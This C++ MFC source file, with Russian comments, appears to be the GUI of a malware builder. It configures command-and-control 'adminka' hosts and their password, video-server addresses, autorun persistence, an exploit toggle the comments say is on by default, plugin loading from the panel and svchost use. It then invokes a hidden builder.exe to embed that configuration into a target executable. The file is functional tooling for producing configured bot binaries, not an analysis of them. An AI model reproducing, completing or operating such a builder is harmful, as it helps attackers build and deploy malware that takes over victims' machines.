
// builder_guiDlg.cpp : файл реализации
//

#include "stdafx.h"
#include "builder_gui.h"
#include "builder_guiDlg.h"
#include "afxdialogex.h"
#include "misc.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// диалоговое окно Cbuilder_guiDlg



Cbuilder_guiDlg::Cbuilder_guiDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(Cbuilder_guiDlg::IDD, pParent)
	, fileConfig(_T(""))
	, namePrefix(_T(""))
	, srcFileName(_T(""))
	, dstFileName(_T(""))
	, hostAdminka1(_T(""))
	, hostAdminka2(_T(""))
	, hostAdminka3(_T(""))
	, periodAdminka(0)
	, passwordAdminka(_T(""))
	, addrServer1(_T(""))
	, addrServer2(_T(""))
	, addrServer3(_T(""))
	, individualServerProcess(FALSE)
	, connectServer(FALSE)
	, downtimeServer(0)
	, autorun(FALSE)
	, sployty(FALSE)
	, check_dublication(FALSE)
	, plugins_server(FALSE)
	, not_used_svchost(FALSE)
	, publicKey(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void Cbuilder_guiDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDE_FILECONFIG, fileConfig);
	DDX_Text(pDX, IDE_PREFIX, namePrefix);
	DDX_Text(pDX, IDE_SRC, srcFileName);
	DDX_Text(pDX, IDE_DST, dstFileName);
	DDX_Text(pDX, IDE_ADMINKA1, hostAdminka1);
	DDX_Text(pDX, IDE_ADMINKA2, hostAdminka2);
	DDX_Text(pDX, IDE_ADMINKA3, hostAdminka3);
	DDX_Text(pDX, IDE_PERIOD, periodAdminka);
	DDX_Control(pDX, IDSPIN_PERIOD, spinPeriod);
	DDX_Text(pDX, IDE_PASSWORD, passwordAdminka);
	DDX_Text(pDX, IDE_SERVER1, addrServer1);
	DDX_Text(pDX, IDE_SERVER2, addrServer2);
	DDX_Text(pDX, IDE_SERVER3, addrServer3);
	DDX_Check(pDX, IDCH_VIDEOPROCESS, individualServerProcess);
	DDX_Check(pDX, IDCH_VIDEOCONNECT, connectServer);
	DDX_Text(pDX, IDE_DOWNTIME, downtimeServer);
	DDX_Control(pDX, IDE_RESBUILD, resBuild);
	DDX_Check(pDX, IDC_AUTORUN, autorun);
	DDX_Check(pDX, IDC_SPLOYTY, sployty);
	DDX_Check(pDX, IDC_CHECKDUBLICATION, check_dublication);
	DDX_Check(pDX, IDC_PLUGINSSERVER, plugins_server);
	DDX_Check(pDX, IDC_CHECK1, not_used_svchost);
	DDX_Text(pDX, IDE_PUBLICKEY, publicKey);
}

BEGIN_MESSAGE_MAP(Cbuilder_guiDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_CTLCOLOR()
	ON_WM_DESTROY()
	ON_BN_CLICKED(IDBT_CONFIG, &Cbuilder_guiDlg::OnBnClickedConfig)
	ON_BN_CLICKED(IDBT_SRC, &Cbuilder_guiDlg::OnBnClickedSrc)
	ON_BN_CLICKED(IDBT_DST, &Cbuilder_guiDlg::OnBnClickedDst)
	ON_BN_CLICKED(IDBT_SAVECONFIG, &Cbuilder_guiDlg::OnBnClickedSaveconfig)
	ON_BN_CLICKED(IDBT_SAVEASCONFIG, &Cbuilder_guiDlg::OnBnClickedSaveasconfig)
	ON_BN_CLICKED(IDBT_BUILD, &Cbuilder_guiDlg::OnBnClickedBuild)
	ON_BN_CLICKED(IDBT_PUBLICKEY, &Cbuilder_guiDlg::OnBnClickedPublickey)
END_MESSAGE_MAP()


// обработчики сообщений Cbuilder_guiDlg

BOOL Cbuilder_guiDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Задает значок для этого диалогового окна. Среда делает это автоматически,
	//  если главное окно приложения не является диалоговым
	SetIcon(m_hIcon, TRUE);			// Крупный значок
	SetIcon(m_hIcon, FALSE);		// Мелкий значок

	// TODO: добавьте дополнительную инициализацию
	hbrHead = CreateSolidBrush( RGB(128, 128, 255) );

	spinPeriod.SetRange( 1, 60 );
	spinPeriod.SetPos(1);
	if( LoadSets() )
	{
		if( fileConfig.GetLength() > 0 )
		{
			LoadConfig(fileConfig);
		}
		UpdateData(FALSE);
	}
	return TRUE;  // возврат значения TRUE, если фокус не передан элементу управления
}

// При добавлении кнопки свертывания в диалоговое окно нужно воспользоваться приведенным ниже кодом,
//  чтобы нарисовать значок. Для приложений MFC, использующих модель документов или представлений,
//  это автоматически выполняется рабочей областью.

void Cbuilder_guiDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // контекст устройства для рисования

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Выравнивание значка по центру клиентского прямоугольника
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Нарисуйте значок
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// Система вызывает эту функцию для получения отображения курсора при перемещении
//  свернутого окна.
HCURSOR Cbuilder_guiDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



HBRUSH Cbuilder_guiDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  Измените любые атрибуты DC
	if( nCtlColor == CTLCOLOR_STATIC ) 
	{
		switch( pWnd->GetDlgCtrlID() )
		{
			case IDC_ADMINKA:
			case IDC_SERVER:
			case IDC_OPTIONS:
			case IDC_VERT:
			case IDC_RESBUILD:
				pDC->SetTextColor( RGB(255, 255, 255) );
				pDC->SetBkMode(TRANSPARENT);
				hbr = hbrHead;
				break;
		}
	}
	// TODO:  Вернуть другое значение дескриптора кисти, если оно не определено по умолчанию
	return hbr;
}


void Cbuilder_guiDlg::OnDestroy()
{
	CDialogEx::OnDestroy();

	// TODO: добавьте свой код обработчика сообщений
	DeleteObject(hbrHead);
	SaveSets();
}


void Cbuilder_guiDlg::OnBnClickedConfig()
{
	CFileDialog fileDialog( TRUE, "config", 0, 0, "*.config|*.config|" );
	if( fileDialog.DoModal() == IDOK )
	{
		fileConfig = fileDialog.GetPathName();
		if( LoadConfig(fileConfig) )
			UpdateData(FALSE);
	}
}


void Cbuilder_guiDlg::OnBnClickedSrc()
{
	CFileDialog fileDialog( TRUE, "exe", 0, 0, "*.exe|*.exe|*.dll|*.dll|" );
	if( fileDialog.DoModal() == IDOK )
	{
		srcFileName = fileDialog.GetPathName();
		if( namePrefix.GetLength() )
		{
			char* path = srcFileName.GetBuffer();
			char* ext = PathFindExtension(path);
			char* file = PathFindFileName(path);
			char folder[MAX_PATH];
			int len = file - path;
			memcpy( folder, path, len );
			folder[len] = 0;
			dstFileName = folder;
			dstFileName += namePrefix;
			dstFileName += ext;
		}
		UpdateData(FALSE);
	}
}


void Cbuilder_guiDlg::OnBnClickedDst()
{
	CFileDialog fileDialog( FALSE, "exe", 0, 0, "*.exe|*.exe|*.dll|*.dll|" );
	if( fileDialog.DoModal() == IDOK )
	{
		dstFileName = fileDialog.GetPathName();
		UpdateData(FALSE);
	}
}

void Cbuilder_guiDlg::OnBnClickedSaveconfig()
{
	UpdateData(TRUE);
	Normalize();
	if( !Verify( true, false ) ) return;
	if( fileConfig.GetLength() == 0 )
	{
		CFileDialog fileDialog( FALSE, "config", 0, 0, "*.config|*.config|" );
		if( fileDialog.DoModal() == IDOK )
		{
			fileConfig = fileDialog.GetPathName();
		}
	}
	if( fileConfig.GetLength() > 0 )
	{
		if( SaveConfig(fileConfig) )
		{
			UpdateData(FALSE);
			MsgDlgMsg( this->m_hWnd, "Конфиг успешно сохранен в файле %s", MB_OK, fileConfig.GetBuffer() );
		}
	}
}

void Cbuilder_guiDlg::OnBnClickedSaveasconfig()
{
	UpdateData(TRUE);
	Normalize();
	if( !Verify( true, false ) ) return;
	CFileDialog fileDialog( FALSE, "config", 0, 0, "*.config|*.config|" );
	if( fileDialog.DoModal() == IDOK )
	{
		if( SaveConfig( fileDialog.GetPathName() ) )
		{
			fileConfig = fileDialog.GetPathName();
			UpdateData(FALSE);
			MsgDlgMsg( this->m_hWnd, "Конфиг успешно сохранен в файле %s", MB_OK, fileConfig.GetBuffer() );
		}
	}
}

void Cbuilder_guiDlg::OnBnClickedBuild()
{
	UpdateData(TRUE);
	Normalize();
	resBuild.SetWindowTextA("");
	if( !Verify( false, true ) ) return;
	if( SaveConfig(fileConfig) )
	{
		CString res;
		if( CreateBuild( fileConfig, srcFileName, dstFileName, res ) )
		{
			resBuild.SetWindowTextA(res);
			MsgDlgMsg( this->m_hWnd, "Билд успешно создан, имя файла %s", MB_OK, dstFileName.GetBuffer() );
		}
	}
}

//убирает по краям пробелы
static char* Trim( char* s )
{
	while( *s == ' ' ) s++;
	int len = strlen(s);
	while( len > 0 && s[len - 1] == ' ' ) len--;
	s[len] = 0;
	return s;
}

static int GetHosts( char** hosts, char* s, int max )
{
	char* p1 = s;
	int count = 0;
	while( *p1 && count < max ) 
	{
		char* p2 = strchr( p1, ',' );
		if( !p2 ) 
			p2 = s + strlen(s);
		else
		{
			*p2 = 0;
			p2++;
		}
		p1 = Trim(p1);
		if( strlen(p1) > 4 )
		{
			hosts[count++] = p1;
		}
		p1 = p2;
	}
	return count;
}

bool Cbuilder_guiDlg::LoadConfig( CString& fileName )
{
	CFile file;
	if( !file.Open( fileName, CFile::modeRead ) )
	{
		MsgDlgErr( this->m_hWnd, "Файл %s невозможно открыть", MB_OK, fileName.GetBuffer() );
		return false;
	}
	int size = file.GetLength();
	char* data = new char[size + 1];
	file.Read( data, size );
	file.Close();
	data[size] = 0;
	char* p1 = data;
	autorun = TRUE; //по умолчанию должен быть автозапуск
	sployty = TRUE; //по умолчанию запускается сплойт
	check_dublication = TRUE; //по умолчанию делается проверка на запуск копии
	plugins_server = FALSE; //по умолчанию плагины грузятся с админки
	while( *p1 )
	{
		char* p2 = strstr( p1, "\r\n" );
		if( !p2 ) 
			p2 = data + size;
		else
		{
			*p2 = 0;
			p2 += 2;
		}
		if( p1[0] != '\\' || p1[1] != '\\' ) //игнорируем комментарии
		{
			char* p3 = strchr( p1, '=' );
			if( p3 ) 
			{
				*p3 = 0;
				p3++;
				p1 = Trim(p1);
				p3 = Trim(p3);
				if( strcmp( p1, "prefix" ) == 0 )
				{
					namePrefix = p3;
				}
				else if( strcmp( p1, "hosts" ) == 0 )
				{
					char* hosts[3];
					CString* hostAdminka[3];
					hostAdminka[0] = &hostAdminka1;
					hostAdminka[1] = &hostAdminka2;
					hostAdminka[2] = &hostAdminka3;
					int count = GetHosts( hosts, p3, 3 );
					for( int i = 0; i < count; i++ )
						*hostAdminka[i] = hosts[i];
				}
				else if( strcmp( p1, "hosts_az" ) == 0 )
				{
				}
				else if( strcmp( p1, "user_az" ) == 0 )
				{
				}
				else if( strcmp( p1, "video_hosts" ) == 0 )
				{
					char* addr[3];
					CString* addrServer[3];
					addrServer[0] = &addrServer1;
					addrServer[1] = &addrServer2;
					addrServer[2] = &addrServer3;
					int count = GetHosts( addr, p3, 3 );
					for( int i = 0; i < count; i++ )
						*addrServer[i] = addr[i];
				}
				else if( strcmp( p1, "video_svchost" ) == 0 )
				{
					if( p3[0] == '1' )
						individualServerProcess = TRUE;
					else
						individualServerProcess = FALSE;
				}
				else if( strcmp( p1, "video_run" ) == 0 )
				{
					if( p3[0] == '1' )
						connectServer = TRUE;
					else
						connectServer = FALSE;
				}
				else if( strcmp( p1, "video_timeout" ) == 0 )
				{
					downtimeServer = atoi(p3);
				}
				else if( strcmp( p1, "password" ) == 0 )
				{
					passwordAdminka = p3;
				}
				else if( strcmp( p1, "period" ) == 0 )
				{
					periodAdminka = atoi(p3);
				}
				else if( strcmp( p1, "autorun" ) == 0 )
				{
					if( p3[0] == '1' )
						autorun = TRUE;
					else
						autorun = FALSE;
				}
				else if( strcmp( p1, "sployty" ) == 0 )
				{
					sployty = (p3[0] == '1') ? TRUE : FALSE;
				}
				else if( strcmp( p1, "check_dublication" ) == 0 )
				{
					check_dublication = (p3[0] == '1') ? TRUE : FALSE;
				}
				else if( strcmp( p1, "plugins_server" ) == 0 )
				{
					plugins_server = (p3[0] == '1') ? TRUE : FALSE;
				}
				else if( strcmp( p1, "not_used_svchost" ) == 0 )
				{
					not_used_svchost = (p3[0] == '1') ? TRUE : FALSE;
				}
				else if( strcmp( p1, "public_key" ) == 0 )
				{
					publicKey = p3;
				}
			}
		}
		p1 = p2;
	}
	return true;
}

static CString MakeHosts( const CString& s1, const CString& s2, const CString& s3 )
{
	CString res;
	const CString* ss[3];
	ss[0] = &s1;
	ss[1] = &s2;
	ss[2] = &s3;
	for( int i = 0; i < 3; i++ )
	{
		if( ss[i]->GetLength() > 0 )
		{
			if( res.GetLength() > 0 ) res += ", ";
			res += *ss[i];
		}
	}
	return res;
}

bool Cbuilder_guiDlg::SaveConfig( CString& fileName )
{
	FILE* file = fopen( fileName.GetBuffer(), "w" );
	if( !file )
	{
		MsgDlgErr( this->m_hWnd, "Невозможно создать файл %s", MB_OK, fileName.GetBuffer() );
		return false;
	}
	fprintf( file, "prefix = %s\n", namePrefix );
	fprintf( file, "hosts = %s\n", MakeHosts( hostAdminka1, hostAdminka2, hostAdminka3 ) );
	fprintf( file, "video_hosts = %s\n", MakeHosts( addrServer1, addrServer2, addrServer3 ) );
	fprintf( file, "video_svchost = %d\n", individualServerProcess ? 1 : 0 );
	fprintf( file, "video_run = %d\n", connectServer ? 1 : 0 );
	fprintf( file, "video_timeout = %d\n", downtimeServer );
	fprintf( file, "password = %s\n", passwordAdminka );
	fprintf( file, "period = %d\n", periodAdminka );
	fprintf( file, "autorun = %d\n", autorun ? 1 : 0 );
	fprintf( file, "sployty = %d\n", sployty ? 1 : 0 );
	fprintf( file, "check_dublication = %d\n", check_dublication ? 1 : 0 );
	fprintf( file, "plugins_server = %d\n", plugins_server ? 1 : 0 );
	fprintf( file, "not_used_svchost = %d\n", not_used_svchost ? 1 : 0 );
	if( publicKey.GetLength() > 0 )
		fprintf( file, "public_key = %s", publicKey );

	fclose(file);
	return true;
}

void Cbuilder_guiDlg::Normalize()
{
	namePrefix = namePrefix.Trim();
	hostAdminka1 = hostAdminka1.Trim();
	hostAdminka2 = hostAdminka2.Trim();
	hostAdminka3 = hostAdminka3.Trim();
	addrServer1 = addrServer1.Trim();
	addrServer2 = addrServer2.Trim();
	addrServer3 = addrServer3.Trim();
	passwordAdminka = passwordAdminka.Trim();
}

bool Cbuilder_guiDlg::Verify( bool onlyConfig, bool nameConfig )
{
	if( nameConfig )
	{
		if( fileConfig.GetLength() == 0 )
		{
			MsgDlgErr( this->m_hWnd, "Вы не указали имя файла конфига" );
			return false;
		}
	}
	if( namePrefix.GetBuffer() == 0 )
	{
		MsgDlgErr( this->m_hWnd, "Вы не указали имя префикса" );
		return false;
	}
	if( passwordAdminka.GetLength() == 0 )
	{
		MsgDlgErr( this->m_hWnd, "Вы не указали пароль к админке" );
		return false;
	}
	if( !onlyConfig )
	{
		if( srcFileName.GetLength() == 0 )
		{
			MsgDlgErr( this->m_hWnd, "Вы не указали имя исходного файла" );
			return false;
		}
		if( dstFileName.GetLength() == 0 )
		{
			MsgDlgErr( this->m_hWnd, "Вы не указали имя конечного файла" );
			return false;
		}
	}
	return true;
}

static CString GetFileNameSets()
{
	char path[MAX_PATH];
	GetModuleFileName( 0, path, sizeof(path) );
	PathRenameExtension( path, ".config" );
	return path;
}

static CString GetStringFromFile( FILE* file )
{
	char buf[MAX_PATH];
	if( fgets( buf, sizeof(buf), file ) )
	{
		int len = strlen(buf);
		if( buf[len - 1] == '\n' ) buf[len - 1] = 0;
	}
	else
		buf[0];
	return buf;
}

bool Cbuilder_guiDlg::LoadSets()
{
	CString fileName = GetFileNameSets();
	FILE* file = fopen( fileName.GetBuffer(), "r" );
	if( !file ) return false;
	fileConfig = GetStringFromFile(file);
	srcFileName = GetStringFromFile(file);
	dstFileName = GetStringFromFile(file);
	fclose(file);
	return true;
}

bool Cbuilder_guiDlg::SaveSets()
{
	CString fileName = GetFileNameSets();
	FILE* file = fopen( fileName.GetBuffer(), "w" );
	if( !file ) return false;
	fprintf( file, "%s\n%s\n%s\n", fileConfig, srcFileName, dstFileName );
	fclose(file);
}

bool Cbuilder_guiDlg::CreateBuild( const CString& fileNameConfig, const CString& src, const CString& dst, CString& res )
{
	char buf[MAX_PATH];
	GetModuleFileName( 0, buf, sizeof(buf) );
	char* p = PathFindFileName(buf);
	*p = 0;
	strcat( buf, "builder.exe" );
	if( !PathFileExists(buf) )
	{
		MsgDlgErr( this->m_hWnd, "Не найден файл %s, он небходим для формирования билда", MB_OK, buf );
		return false;
	}
	CString cmd = buf;
	cmd += ' ';
	cmd += src;
	cmd += ' ';
	cmd += fileNameConfig;
	cmd += ' ';
	cmd += dst;

	HANDLE stdoutReadHandle = 0;
    HANDLE stdoutWriteHandle = 0;

    SECURITY_ATTRIBUTES saAttr; 
    memset( &saAttr, 0, sizeof(saAttr) ); 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL; 

    CreatePipe( &stdoutReadHandle, &stdoutWriteHandle, &saAttr, 5000);
    SetHandleInformation( stdoutReadHandle, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	memset( &si, 0, sizeof(si) );
	memset( &pi, 0, sizeof(pi) );
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdError = stdoutWriteHandle;
    si.hStdOutput = stdoutWriteHandle;
    si.hStdInput = INVALID_HANDLE_VALUE;//GetStdHandle(STD_INPUT_HANDLE);
    si.dwFlags |= STARTF_USESTDHANDLES;

	bool ret = false;
	if( CreateProcess( 0, cmd.GetBuffer(), 0, 0, TRUE, CREATE_NO_WINDOW, 0, 0, &si, &pi ) )
	{
		CloseHandle(stdoutWriteHandle);
		for(;;)
		{
			DWORD rd;
            if( ReadFile( stdoutReadHandle, buf, sizeof(buf) - 1, &rd, NULL ) )
			{
				buf[rd] = 0;
				res += buf;
			}
			else
				break;
        }
		if( res.GetLength() > 0 ) ret = true;
		if( WaitForSingleObject( pi.hProcess, 2000 ) == WAIT_OBJECT_0 )
		{
			ret = true;
		}
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	CloseHandle(stdoutReadHandle);
	return ret;
}



void Cbuilder_guiDlg::OnBnClickedPublickey()
{
	CFileDialog fileDialog( TRUE, "key", 0, 0, "*.key|*.key|" );
	if( fileDialog.DoModal() == IDOK )
	{
		publicKey = fileDialog.GetPathName();
		UpdateData(FALSE);
	}
}
